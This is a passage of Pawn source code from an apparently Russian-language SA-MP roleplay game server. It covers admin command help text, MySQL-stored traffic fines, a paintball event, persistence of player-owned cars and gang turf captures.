			cam_x = pos_x + 15.0 * -floatsin(angle, degrees);
			cam_y = pos_y + 15.0 * floatcos(angle, degrees);

			SetPlayerCameraPos(playerid, cam_x, cam_y, pos_z + 10.0);
			SetPlayerCameraLookAt(playerid, pos_x, pos_y, pos_z);
		}
		case REALTOR_TYPE_GARAGE:
		{
			pos_x = g_garages[index][G_POS_X];
			pos_y = g_garages[index][G_POS_Y];
			pos_z = g_garages[index][G_POS_Z];

			exit_x = g_garages[index][G_POS_X];
			exit_y = g_garages[index][G_POS_Y];

			angle = __GetAngleToPoint(pos_x, pos_y, exit_x, exit_y);

			cam_x = pos_x + 15.0 * -floatsin(angle + 270.0, degrees);
			cam_y = pos_y + 15.0 * floatcos(angle + 270.0, degrees);

			SetPlayerCameraPos(playerid, cam_x, cam_y, pos_z + 10.0);
			SetPlayerCameraLookAt(playerid, pos_x, pos_y, pos_z);
		}
	}

	/*angle = _GetAngleToPoint(exit_x, exit_y, pos_x, pos_y);
	SetPlayerPos(playerid, pos_x, pos_y, pos_z);

	cam_x = pos_x + 15.0 * -floatsin(angle, degrees);
	cam_y = pos_y + 15.0 * floatcos(angle, degrees);

	SetPlayerCameraPos(playerid, cam_x, cam_y, pos_z + 10.0);
	SetPlayerCameraLookAt(playerid, pos_x, pos_y, pos_z);*/

	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid, 0);

	return 1;
}

enum E_CMDS_ADM_STRUCT
{
	ADM_INFO[2048]
};

new help_cmds_adm_list[7][E_CMDS_ADM_STRUCT] =
{
	{
		!"{FFFFFF}Команды администратора: {FFCC00}1 уровень:{FFFFFF}\n\n"\
		"/pp - пожелать приятной игры\n"\
		"/mutelist - список игроков с мутом\n"\
		"/jaillist - список игроков в деморгане\n"\
		"/afk - список игроков в афк\n"\
		"/as [текст] -support-чат\n"\
		"/ans [ид игрока] [текст] - ответить игроку\n"\
		"/pm [ид игрока] [текст] - ответить игроку\n"\
		"/asall - Вызвать администратора к себе в чат\n"\
		"/spawn [ид игрока] - заспавнить игрока\n"\
		"/goto [ид игрока] - телепортироваться к игроку\n"\
		"/gotocar [ид транспорта] - телепортироваться к транспорту\n"\
		"/freeze [ид игрока] [время] - заморозить игрока\n"\
		"/unfreeze [ид игрока] - разморозить игрока\n"\
		"/atakegun [ид игрока] - забрать оружие у игрока\n"\
		"/mute [ид игрока] [время] [причина] - заткнуть игрока\n"\
		"/slap [ид игрока] - шлепнуть игрока\n"\
		"/ahelp - помощь администратору\n"\
		"/spec [ид игрока] - начать наблюдать за игроком\n"\
		"/specoff - закончить наблюдать за игроком"
	},
	{
		!"{FFFFFF}Команды администратора: {FFCC00}2 уровень:{FFFFFF}\n\n"\
		"/gm [ид игрока] - проверить игрока на гм\n"\
		"/jet - использовать JetPack\n"\
		"/test3 - поиск свободных домов\n"\
		"/test2 - просмотр настроек аккаунта игроков\n"\
		"/test1 - просмотр панели цветов\n"\
		"/getcar [ид транспорта] - телепортировать транспорт к себе\n"\
		"/gethere [ид игрока] - телепортировать игрока к себе\n"\
		"/pgetip [ip] - поиск игроков с указанным IP\n"\
		"/kick [ид игрока] [причина] - кикнуть игрока\n"\
		"/skick [ид игрока] - кикнуть игрока по-тихому\n"\
		"/warn [ид игрока] [причина] - выдать предупреждение\n"\
		"/unmute [ид игрока] - снять мут\n"\
		"/jail [ид игрока] [время] [причина] - посадить в тюрьму\n"\
		"/unjail [ид игрока] - вытащить из тюрьмы\n"\
		"/veh [модель] [цвет1] [цвет2] - создать транспорт\n"\
		"/delveh [ид транспорта] - удалить созданный транспорт\n"\
		"/fixveh - ремонт транспорта\n"\
		"/setfuel [объем] - изменить объем топлива\n"\
		"/res [радиус] - респавн транспорта в радиусе\n"
	},

	{
		!"{FFFFFF}Команды администратора: {FFCC00}3 уровень:{FFFFFF}\n\n"\
		"/mp - меню мероприятий\n"\
		"/settp - установить точку телепортации на МП\n"\
		"/agivevoen [ид игрока] - выдать военный билет\n"\
		"/setam [ид игрока] [значение] - выдать броню\n"\
		"/object [ид игрока] - выдать объект игроку\n"\
		"/msg [текст] - отправить сообщение от администратора\n"\
		"/ban [ид игрока] [время] [причина] - выдать бан\n"\
		"/ainfo [ид игрока] - посмотреть статистику админа\n"\
		"/unwarn [ид игрока] - снять предупреждение\n"\
		"/tempskin [ид игрока] [скин] - изменение скина\n"\
		"/setskin [ид игрока] [скин] - изменение скина\n"\
		"/fuelcars - заправить весь транспорт\n"\
		"/gun [ид игрока] - информация об оружиях\n"\
		"/agl [ид игрока] - выдать лицензии\n"\
		"/atake [ид игрока] - отобрать лицензии\n"\
		"/alldehveh - удалить все админ-автомобили\n"\
		"/offget [ник] - получить оффлайн-статистику\n"\
		"/adivorce [ид игрока] - развести игрока\n"\
		"/check [ид игрока] - посмотреть статистику игрока\n"\
		"/veh [ид авто] [цвет 1] [цвет 2] - создать транспорт\n"\
		"/delveh - удалить транспорт (сидя в нем)\n"\
		"/delvehid [ид авто] - удалить транспорт (по ид)\n"
	},
	{
		!"{FFFFFF}Команды администратора: {FFCC00}4 уровень:{FFFFFF}\n\n"\
		"/setworld [вирт. мир] [инт.] - установить себе вирт. мир и интерьер\n"\
		"/myworld - узнать свой вирт. мир и интерьер\n"\
		"/reset_bank_door - восстановить дверь в банке\n"\
		"/startpb - начать пейнтбол\n"\
		"/setname [ид игрока] [ник] - сменить ник\n"\
		"/settime [время] - сменить время\n"\
		"/setweather [погода] - сменить погоду\n"\
		"/sban [ид игрока] [время] [причина] - тихий бан\n"\
		"/offwarn [ник] - предупреждение по нику\n"\
		"/givegun [ид игрока] [оружие] - выдать оружие\n"\
		"/setskill [ид игрока] - изменить скиллы игрока\n"\
		"/giveinv [ид игрока] [предмет] - выдать предмет\n"\
		"/checkinv [ид игрока] - посмотреть предметы\n"\
		"/setnick [ид игрока] [имя] - изменить временное имя\n"

	},

	{
		!"{FFFFFF}Команды администратора: {FFCC00}5 уровень:{FFFFFF}\n\n"\
		"/iban [ид игрока] - забанить аккаунт навсегда\n"\
		"/clearchat - очистить чат всем игрокам\n"\
		"/offban [ник] - оффлайн-бан\n"\
		"/aunwarn [ид игрока] - снять предупреждение с админа\n"\
		"/lunwarn [ид игрока] - снять предупреждение с лидера\n"\
		"/offlwarn [ник] - выдать предупреждения с лидера по нику\n"\
		"/offawarn [ник] - выдать предупреждение с админа по нику\n"\
		"/offlunwarn [ник] - снять предупреждение с лидера по нику\n"\
		"/offaunwarn [ник] - снять предупреждение по нику с админа\n"\
		"/lwarn [ид игрока] - выдать предупреждение лидеру\n"\
		"/awarn [ид игрока] - выдать предупреждение администратору\n"\
		"/unban [ник] - разбанить игрока\n"\
		"/banip [ip] - заблокировать IP\n"\
		"/unbanip [ip] - разбанить IP\n"\
		"/alogs [тип] - включить/отключить логи входов/выходов\n"\
		"/aclogs [тип] - включить/отключить логи античита\n"\
		"/setvip [ид игрока] [уровень] - изменить VIP статус\n"\
		"/unbanadm [ид игрока] - разблокировать админ-действия\n"\
		"/setadmin [ид игрока] [уровень] - выдать права админа\n"\
		"/admremove [ид игрока] - снять права администратора\n"\
		"/admdown [ид игрока] - понизить права администратора\n"\
		"/admup [ид игрока] - повысить права администратора\n"\
		"/setleader [ид игрока] [фракция] - изменить права лидера\n"\
		"/ainvite [ид игрока] [фракция] - принять игрока во фракцию\n"\
		"/uval [ид игрока] - уволить игрока из фракции\n"\
		"/agiverank [ид игрока] [ранг] - выдать ранг игроку\n"\
		"/aclear [ид игрока] - снять розыск с игрока\n"

	},

	{
		!"{FFFFFF}Команды администратора: {FFCC00}6 уровень:{FFFFFF}\n\n"\
		"/activate [ид игрока] - активировать аккаунт\n"\
		"/deactivate [ид игрока] - деактивировать аккаунт\n"\
		"/banpodset [ip] - блокировка подсети игрока\n"\
		"/rt [x,y,z] - телепорт по координатам\n"\
		"/rt2 [x,y,z,world,int] - телепорт в точку\n"\
		"/afly - полет камерой\n"\
		"/gcontrol - гетто-панель\n"\
		"/amusic - управление музыкой\n"\
		"/dj - управление музыкой (по ссылке)\n"
	},

	{
		!"{FFFFFF}Команды администратора: {FFCC00}7 уровень:{FFFFFF}\n\n"\
		"/st_set - настройки стримера\n"\
		"/givefull [ид игрока] - выдать полный доступ\n"\
		"/setcar [ид игрока] [слот] - управление ТС игрока\n"\
		"/createradar - создать радар\n"\
		"/setstat [ид игрока] - изменить статистику игрока\n"\
		"/givemoney [ид игрока] [значение] - выдать деньги\n"\
		"/givecredits [ид игрока] [значение] - выдадь кредиты\n"\
		"/fake [ид игрока] [команда] - вызвать команду от игрока\n"\
		"/resetmoney [ид игрока] - забрать деньги игрока\n"\
		"/entrance_exit - изменить точку выхода из подъезда\n"\
		"/add - создание объектов\n"\
		"/setbizcoordexit - изменить точку выхода из бизнеса\n"\
		"/grandadmins - список специальных администраторов\n"\
		"/vpc [модель] - создать транспорт для фракции\n"\
		"/tpc [координаты] - создание дома\n"\
		"/gmx - рестарт сервера\n"\
		"/pmenu - меню промокодов\n"\
		"/payday - вызвать PayDay\n"
	}
};

stock ShowPlayerDialogAdminCommands(playerid, lvl = 0)
{
	ShowPlayerDialog
	(
		playerid, DIALOG_AHELP, DIALOG_STYLE_MSGBOX,
		"{FFCC00}Команды администратирования",
		help_cmds_adm_list[lvl][ADM_INFO],
		"Далее", "Закрыть"
	);
	return 1;
}

CMD:tickets(playerid, params[])
{
	new rows, Cache: result;

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM fines WHERE owner_id=%d", PI[playerid][pID]);
	result = mysql_query(dbHandle, STRING_GLOBAL);

	rows = cache_num_rows();

	SendClientMessage(playerid, C_OSNOV, "Неоплаченные штрафы:");

	if(!rows)
		return SendClientMessage(playerid, C_RED, "Штрафы отсутствуют"), cache_delete(result);

	new id,
		reason[64],
		amount,
		time,
		date_[64];

	new year, month, day;
	new hour, minute, second;

	for(new idx; idx < rows; idx ++)
	{
		id = cache_get_field_content_int(idx, "id");
		amount = cache_get_field_content_int(idx, "amount");
		time = cache_get_field_content_int(idx, "time");

		timestamp_to_date(time, year, month, day, hour, minute, second);

		cache_get_field_content(idx, "reason", reason);

		format(date_, sizeof date_, "%d-%02d-%02d %02d:%02d:%02d", year, month, day, hour, minute, second);

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Штраф №%d. Причина: %s. Оплата: %d рублей. Дата: %s", id, reason, amount, date_);
		SendClientMessage(playerid, C_BLUE, STRING_GLOBAL);
	}

	SendClientMessage(playerid, C_OSNOV, "Для более удобного чтения воспользуйтесь chatlog.txt");

	cache_delete(result);

	return 1;
}

stock WritePlayerFine(playerid, amount, reason[] = "")
{
	STRING_GLOBAL[0] = EOS;
	mysql_format(dbHandle, STRING_GLOBAL, sizeof STRING_GLOBAL, "INSERT INTO fines (`owner_id`, `amount`, `reason`, `time`) VALUES ('%d', '%d', '%s', '%d')", PI[playerid][pID], amount, reason, gettime());
	mysql_query(dbHandle, STRING_GLOBAL);

	new rows, Cache: result;

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM fines WHERE owner_id=%d", PI[playerid][pID]);
	result = mysql_query(dbHandle, STRING_GLOBAL);

	rows = cache_num_rows();

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Ваш был выписан штраф на сумму %d рублей. Причина: %s", amount, reason);
	SendClientMessage(playerid, C_BLUE, STRING_GLOBAL);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "В данный момент у Вас %d/30 штрафов. Просмотреть все свои штрафы можно с помощью /tickets", rows);
	SendClientMessage(playerid, C_BLUE, STRING_GLOBAL);

	if(rows > 29)
	{
		SendClientMessage(playerid, C_BLUE, "Вы были лишены прав за неуплату штрафов. Оплатить их можно в любом банке (/gps > 5)");

		if(GetPlayerVehicleID(playerid) != INVALID_VEHICLE_ID) RemovePlayerFromVehicle(playerid);

		g_player_skills[playerid][S_LICS][0] = 0;
		SavePlayerSkills(playerid);
	}

	cache_delete(result);

	return 1;
}

stock GetPlayerFines(playerid)
{
	new rows, Cache: result;

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM fines WHERE owner_id=%d", PI[playerid][pID]);
	result = mysql_query(dbHandle, STRING_GLOBAL);

	rows = cache_num_rows();

	cache_delete(result);

	return rows;
}

stock StartPaintball()
{
	if(g_paintball_info[PB_STATUS] != 2)
		return 1;

	TextDrawSetString(paintball_td[8], "0");
	TextDrawSetString(paintball_td[9], "0");

	foreach(new playerid: Player)
	{
		if(PI[playerid][P_PB_TEAM] == -1)
			continue;

		SetPlayerSkin(playerid, PI[playerid][P_PB_TEAM] == 0 ? 285 : 144);

		GivePlayerWeapon(playerid, 30, 600);
		GivePlayerWeapon(playerid, 25, 600);
		GivePlayerWeapon(playerid, 24, 600);

		SetPlayerHealth(playerid, 100.0);
		SetPlayerArmour(playerid, 0.0);

		new r = random(2);
		SetPlayerPos(playerid, paintball_spawn[g_paintball_info[PB_MAP]][PI[playerid][P_PB_TEAM]][r][0], paintball_spawn[g_paintball_info[PB_MAP]][PI[playerid][P_PB_TEAM]][r][1], paintball_spawn[g_paintball_info[PB_MAP]][PI[playerid][P_PB_TEAM]][r][2]);
		SetPlayerFacingAngle(playerid, paintball_spawn[g_paintball_info[PB_MAP]][PI[playerid][P_PB_TEAM]][r][0]);
		FreezePlayer(playerid, 2000);

		SetPlayerInterior(playerid, 1);
		SetPlayerVirtualWorld(playerid, 1);

		for(new idx = 0; idx < sizeof paintball_td; idx ++) TextDrawShowForPlayer(playerid, paintball_td[idx]);
	}

	return 1;
}

forward StopPaintBall(prize, spawn_player);
public StopPaintBall(prize, spawn_player)
{
	if(g_paintball_info[PB_STATUS] != 2)
		return 1;

	new winner = g_paintball_info[PB_TEAM_KILLS][0] >= 30 ? 0 : 1;

	if(prize == 0) SendClientMessageToAll(C_OSNOV, " Матч по пейтнболлу отменен из-за недостаточного количества участников");

	foreach(new playerid: Player)
	{
		if(PI[playerid][P_PB_TEAM] == -1)
			continue;

		if(prize == 1)
		{
			for(new idx = 0; idx < sizeof paintball_td; idx ++) TextDrawHideForPlayer(playerid, paintball_td[idx]);

			if(PI[playerid][P_PB_TEAM] == winner)
			{
				SendClientMessage(playerid, C_OSNOV, "За победу в пейнтболле Вы получили 25000 рублей");

				GiveMoney(playerid, 25000);
			}

			PI[playerid][P_PB_TEAM] = -1;

			if(spawn_player != playerid) SpawnPlayer(playerid);
		}

		PI[playerid][P_PB_KILLS] =
		PI[playerid][P_PB_DEATHS] = 0;

		PI[playerid][P_PB_TEAM] = -1;
	}

	g_paintball_info = g_paintball_default_values;

	return 1;
}

stock LoadPlayerOwnableCar(playerid, id)
{
	new rows,
		Cache: result;

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "SELECT * FROM ownable_cars WHERE id=%d LIMIT 1", id);
	result = mysql_query(dbHandle, STRING_GLOBAL);

	rows = cache_num_rows();

	if(rows)
	{
		new slot = cache_get_field_content_int(0, "slot");

		if(cache_get_field_content_int(0, "virtual") >= 10000){
			STRING_GLOBAL[0] = '\0';
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Ваш транспорт в слоте №%d находится на штрафстоянке (/gps -> 1 -> 14)", slot);
			SendClientMessage(playerid, C_OSNOV, STRING_GLOBAL);
			return 1;
		}

		new model = cache_get_field_content_int(0, "model"),
			color_1 = cache_get_field_content_int(0, "color_1"),
			color_2 = cache_get_field_content_int(0, "color_2"),
			coms[64];

		new Float:x = cache_get_field_content_float(0, "pos_x"),
			Float:y = cache_get_field_content_float(0, "pos_y"),
			Float:z = cache_get_field_content_float(0, "pos_z");

		PI[playerid][P_OWNABLE_CAR][slot-1] = CreateVehicle
		(
			model,
			x, y, z,
			cache_get_field_content_float(0, "pos_r"),
			color_1,
			color_2,
			-1
		);

		new vehicleid = PI[playerid][P_OWNABLE_CAR][slot-1];

		g_vehicle[vehicleid][veh_x] = x;
		g_vehicle[vehicleid][veh_y] = y;
		g_vehicle[vehicleid][veh_z] = z;

		SetVehicleData(vehicleid, veh_slot, slot);

		SetVehicleData(vehicleid, veh_owner_id, playerid);

		SetVehicleData(vehicleid, veh_virtual, cache_get_field_content_int(0, "virtual"));

		if(cache_get_field_content_int(0, "virtual") > 1000)
		{
			SetVehicleVirtualWorld(vehicleid, cache_get_field_content_int(0, "virtual")-1000);
			SetVehicleData(vehicleid, veh_virtual, cache_get_field_content_int(0, "virtual")-1000);
		}

		LinkVehicleToInterior(vehicleid, GetVehicleData(vehicleid, veh_virtual));

        SetVehicleData(vehicleid, veh_type_num, cache_get_field_content_int(0, "type_number"));

		cache_get_field_content(0, "number", g_vehicle[vehicleid][veh_number], dbHandle, 32);

        SetVehicleNumberPlate(vehicleid, g_vehicle[vehicleid][veh_number]);

		cache_get_field_content(0, "veh_com", coms);
		format(g_vehicle[vehicleid][veh_com], 64, "%s", coms);

		sscanf(g_vehicle[vehicleid][veh_com], "p<,>a<i>[14]", g_vehicle[vehicleid][veh_coms]);

		ChangeVehicleColor(vehicleid, color_1, color_2);
		ChangeVehiclePaintjob(vehicleid, cache_get_field_content_int(0, "paintjob"));

		for(new i = 13; i >= 0; i --)
		{
			if(g_vehicle[vehicleid][veh_coms][i] != 0) AddVehicleComponent(vehicleid, g_vehicle[vehicleid][veh_coms][i]);
		}

		SetVehicleData(vehicleid, veh_sql_id, cache_get_field_content_int(0, "id"));
		SetVehicleData(vehicleid, veh_fuel, cache_get_field_content_int(0, "fuel"));
		SetVehicleData(vehicleid, veh_locked, bool: cache_get_field_content_int(0, "lock"));
		SetVehicleData(vehicleid, veh_health, cache_get_field_content_float(0, "health"));
		SetVehicleData(vehicleid, veh_improve, cache_get_field_content_int(0, "engine"));
		SetVehicleData(vehicleid, veh_paintjob, cache_get_field_content_int(0, "paintjob"));

		PI[playerid][P_LOAD_JOB] = cache_get_field_content_int(0, "products");

		SetVehicleHealth(vehicleid, GetVehicleData(vehicleid, veh_health));
		CarDoors(vehicleid, GetVehicleData(vehicleid, veh_locked));

		printf("LoadOwnableCar %s[%d] - %s (i: %d | sql: %d | slot: %d | number: %s)", GetName(playerid), playerid, GetVehicleModel(vehicleid), vehicleid, g_vehicle[vehicleid][veh_sql_id], g_vehicle[vehicleid][veh_slot], g_vehicle[vehicleid][veh_number]);

		if(GetVehicleData(vehicleid, veh_slot) != 55)
		{
			if(IsValidDynamic3DTextLabel(g_vehicle[vehicleid][veh_number_label]))
			DestroyDynamic3DTextLabel(g_vehicle[vehicleid][veh_number_label]);

			if(IsValidDynamic3DTextLabel(g_vehicle[vehicleid][veh_label]))
			DestroyDynamic3DTextLabel(g_vehicle[vehicleid][veh_label]);

			if(!strcmp(g_vehicle[vehicleid][veh_number], "-1", false))

			g_vehicle[vehicleid][veh_number_label] = CreateDynamic3DTextLabel(g_vehicle[vehicleid][veh_number], 0xFFFFFFFF, 0.0, 0.0, 0.0, 15.0, _, vehicleid);
			Attach3DTextLabelToVehicle(g_vehicle[vehicleid][veh_number_label], vehicleid, 0.0, 0.0, 0.0);

			SetVehicleNumberPlate(vehicleid, g_vehicle[vehicleid][veh_number]);
		}
		else
		{
			DestroyDynamic3DTextLabel(g_vehicle[vehicleid][veh_label]);

			new max_products;

			for(new i; i < sizeof g_max_products; i ++)
			{
				if(GetVehicleModel(vehicleid) == g_max_products[i][0])
				{
					max_products = g_max_products[i][1];
					break;
				}
			}

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Доставка продуктов\n{FFFFFF}Загружено %d / %d шт.", PI[playerid][P_LOAD_JOB], max_products);

			g_vehicle[vehicleid][veh_label] = CreateDynamic3DTextLabel(STRING_GLOBAL, 0xFF6600FF, 0.0, 2.1, 2.1, 20.0, _, vehicleid);
		}
		STRING_GLOBAL[0] = '\0';
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Ваш транспорт в слоте №%d успешно загружен. Найти его можно с помощью команды: /findcar", slot);
		SendClientMessage(playerid, C_OSNOV, STRING_GLOBAL);
	}

	cache_delete(result);
	return 1;
}

stock UnLoadPlayerOwnableCar(playerid, index)
{
	new vehicleid = PI[playerid][P_OWNABLE_CAR][index];

	if(vehicleid == INVALID_VEHICLE_ID)
		return 1;

	if(GetVehicleData(vehicleid, veh_owner_id) != playerid)
		return 1;

	printf("UnLoadOwnableCar %s[%d] - %s (i: %d | sql: %d | slot: %d | number: %s)", GetName(playerid), playerid, GetVehicleModel(vehicleid), vehicleid, g_vehicle[vehicleid][veh_sql_id], g_vehicle[vehicleid][veh_slot], g_vehicle[vehicleid][veh_number]);

	SavePlayerOwnableCar(playerid, vehicleid);

	if(GetVehicleData(vehicleid, veh_slot) == 5)
	{
		PI[playerid][P_LOAD_JOB] = 0;

		if(PI[playerid][P_ORDER_ID] != -1)
		{
			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE orders SET status=0 WHERE id=%d", PI[playerid][P_ORDER_ID]);
			mysql_query(dbHandle, STRING_GLOBAL);

			PI[playerid][P_ORDER_BIZ_ID]					=
			PI[playerid][P_ORDER_TIME]						=
			PI[playerid][P_ORDER_ID]						= -1;
		}

	}

	if(IsValidDynamic3DTextLabel(g_vehicle[vehicleid][veh_number_label]))
	DestroyDynamic3DTextLabel(g_vehicle[vehicleid][veh_number_label]);

	if(IsValidDynamic3DTextLabel(g_vehicle[vehicleid][veh_label]))
	DestroyDynamic3DTextLabel(g_vehicle[vehicleid][veh_label]);

	ClearVehicleData(vehicleid);

	DestroyVehicle(vehicleid);

	PI[playerid][P_OWNABLE_CAR][index] = INVALID_VEHICLE_ID;

	SendClientMessage(playerid, C_OSNOV, "Ваш транспорт выгружен");

	return 1;
}

stock SavePlayerOwnableCar(playerid, vehicleid)
{
	if(GetVehicleData(vehicleid, veh_owner_id) != playerid)
		return 1;

	g_vehicle[playerid][veh_coms][0] = GetVehicleComponentInSlot(vehicleid, CARMODTYPE_SPOILER);
	g_vehicle[playerid][veh_coms][1] = GetVehicleComponentInSlot(vehicleid, CARMODTYPE_HOOD);
	g_vehicle[playerid][veh_coms][2] = GetVehicleComponentInSlot(vehicleid, CARMODTYPE_ROOF);
	g_vehicle[playerid][veh_coms][3] = GetVehicleComponentInSlot(vehicleid, CARMODTYPE_SIDESKIRT);
	g_vehicle[playerid][veh_coms][4] = GetVehicleComponentInSlot(vehicleid, CARMODTYPE_LAMPS);
	g_vehicle[playerid][veh_coms][5] = GetVehicleComponentInSlot(vehicleid, CARMODTYPE_NITRO);
	g_vehicle[playerid][veh_coms][6] = GetVehicleComponentInSlot(vehicleid, CARMODTYPE_EXHAUST);
	g_vehicle[playerid][veh_coms][7] = GetVehicleComponentInSlot(vehicleid, CARMODTYPE_WHEELS);
	g_vehicle[playerid][veh_coms][8] = GetVehicleComponentInSlot(vehicleid, CARMODTYPE_STEREO);
	g_vehicle[playerid][veh_coms][9] = GetVehicleComponentInSlot(vehicleid, CARMODTYPE_HYDRAULICS);
	g_vehicle[playerid][veh_coms][10] = GetVehicleComponentInSlot(vehicleid, CARMODTYPE_FRONT_BUMPER);
	g_vehicle[playerid][veh_coms][11] = GetVehicleComponentInSlot(vehicleid, CARMODTYPE_REAR_BUMPER);
	g_vehicle[playerid][veh_coms][12] = GetVehicleComponentInSlot(vehicleid, CARMODTYPE_VENT_RIGHT);
	g_vehicle[playerid][veh_coms][13] = GetVehicleComponentInSlot(vehicleid, CARMODTYPE_VENT_LEFT);
	format(g_vehicle[playerid][veh_com], 64, "%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d",
	g_vehicle[playerid][veh_coms][0], g_vehicle[playerid][veh_coms][1], g_vehicle[playerid][veh_coms][2],
	g_vehicle[playerid][veh_coms][3], g_vehicle[playerid][veh_coms][4], g_vehicle[playerid][veh_coms][5],
	g_vehicle[playerid][veh_coms][6], g_vehicle[playerid][veh_coms][7], g_vehicle[playerid][veh_coms][8],
	g_vehicle[playerid][veh_coms][9], g_vehicle[playerid][veh_coms][10], g_vehicle[playerid][veh_coms][11],
	g_vehicle[playerid][veh_coms][12], g_vehicle[playerid][veh_coms][13]);

	new Float:health;
	GetVehicleHealth(vehicleid, health);

	if(health < 300.0) health = 300.0;

	SetVehicleData(vehicleid, veh_health, health);

	STRING_GLOBAL[0] = EOS;
	format
	(
		STRING_GLOBAL, sizeof STRING_GLOBAL,
		"UPDATE ownable_cars SET fuel=%d, mileage=%f, health=%f, veh_wear=%f WHERE owner_name = '%s' AND slot=%d",
		GetVehicleData(vehicleid, veh_fuel),
		GetVehicleData(vehicleid, veh_milliage),
		GetVehicleData(vehicleid, veh_health),
		GetVehicleData(vehicleid, veh_wear),
		GetName(playerid),
		GetVehicleData(vehicleid, veh_slot)
	);
	mysql_query(dbHandle, STRING_GLOBAL);
	return 1;
}

stock GetPlayerOwnableCar(playerid)
{
	new rows;
	new fmt_query[90];
	new Cache: result;

	mysql_format(dbHandle, fmt_query, sizeof fmt_query, "SELECT * FROM ownable_cars WHERE owner_name='%e'", GetName(playerid));
	result = mysql_query(dbHandle, fmt_query);

	rows = cache_num_rows();

	if(!rows) return cache_delete(result) & 0;

	return cache_delete(result) & 1;
}

stock ShowPlayerListOwnbaleCar(playerid, dialogid, name[] = "{f6e58d}Личный транспорт")
{
	new rows;
	new fmt_query[90];
	new Cache: result;
	new fmt_str[144];
	new number[32];
	new status[100];

	mysql_format(dbHandle, fmt_query, sizeof fmt_query, "SELECT * FROM ownable_cars WHERE owner_name='%s' ORDER BY slot", GetName(playerid));
	result = mysql_query(dbHandle, fmt_query);

	rows = cache_num_rows();

	if(!rows)
		return SendClientMessage(playerid, COLOR_RED, "У Вас нет личного транспорта"), cache_delete(result);

	STRING_GLOBAL = "Название\tНомер\tСтатус\n";

	for(new idx; idx < rows; idx ++)
	{
		cache_get_row(idx, 11, number, dbHandle, 32);

		if(!strcmp(number, "-1", false))
			number = "НЕТ НОМЕРОВ";

		if(IsValidVehicle(PI[playerid][P_OWNABLE_CAR][cache_get_row_int(idx, 5)-1]))
			format(status, sizeof status, "{f6e58d}(Используется) {FFFFFF}- ID:%d", PI[playerid][P_OWNABLE_CAR][cache_get_row_int(idx, 5)-1]);
		else
			format(status, sizeof status, "{669900}(Не используется)");

		format(fmt_str, sizeof fmt_str, "{f6e58d}%d{ffffff}. %s (%d)\t[ %s ]\t%s\n", idx + 1, g_vehicle_info[cache_get_row_int(idx, 2) - 400][VI_NAME], cache_get_row_int(idx, 2), number, status);
		strcat(STRING_GLOBAL, fmt_str);

		g_player_listitem[playerid][idx] = cache_get_row_int(idx, 0);
	}

	ShowPlayerDialog
	(
		playerid, dialogid, DIALOG_STYLE_TABLIST_HEADERS,
		name,
		STRING_GLOBAL,
		"Далее", "Отмена"
	);

	return 1;
}

stock StartCapture(idx, attack_team, protect_team)
{
	ClearCaptureData;

	SetCaptureData(C_STATUS, bool: true);
	SetCaptureData(C_BIZ_ID, idx);
	SetCaptureData(C_TEAM_ATTACK, attack_team);
	SetCaptureData(C_TEAM_PROTECT, protect_team);
	SetCaptureData(C_TIME, 10 * 60);
	SetCaptureData(C_TEAM_ATTACK_KILLS, 0);
	SetCaptureData(C_TEAM_PROTECT_KILLS, 0);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%s", Fraction_Name[g_capture[C_TEAM_ATTACK]]);
	TextDrawSetString(capture_td[5], STRING_GLOBAL);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%s", Fraction_Name[g_capture[C_TEAM_PROTECT]]);
	TextDrawSetString(capture_td[6], STRING_GLOBAL);

	foreach(new playerid: Player)
	{
		if(!IsAMafia(playerid))
			continue;

		GangZoneShowForPlayer(playerid, CaptureZone, 0xDA0816FF);

		for(new i; i < sizeof capture_td; i ++) TextDrawShowForPlayer(playerid, capture_td[i]);
	}

	return 1;
}

stock EndCapture()
{
	new attack_team = g_capture[C_TEAM_ATTACK],
		protect_team = g_capture[C_TEAM_PROTECT],
		businessid = g_capture[C_BIZ_ID];

	if(businessid != 0)
	{
		if(g_capture[C_TEAM_ATTACK_KILLS] > g_capture[C_TEAM_PROTECT_KILLS])
		{
			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "[R] Вы выиграли, бизнес %s (№%d) Ваш", BizzInfo[businessid][bName], businessid);
			SendFMes(attack_team, 0x4682B4AA, STRING_GLOBAL);

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "[R] Вы поиграли, бизнес %s (№%d) был отдан", BizzInfo[businessid][bName], businessid);
			SendFMes(protect_team, 0x4682B4AA, STRING_GLOBAL);

			BizzInfo[businessid][bControl] = attack_team;

		}
		else
		{
			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "[R] Вы поиграли, бизнес %s (№%d) был отдан", BizzInfo[businessid][bName], businessid);
			SendFMes(attack_team, 0x4682B4AA, STRING_GLOBAL);

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof STRING_GLOBAL, "[R] Вы выиграли, бизнес %s (№%d) Ваш", BizzInfo[businessid][bName], businessid);
			SendFMes(protect_team, 0x4682B4AA, STRING_GLOBAL);

			BizzInfo[businessid][bControl] = protect_team;
		}

		MysqlUpdateBizzInt(businessid, "control", BizzInfo[businessid][bControl]);
	}

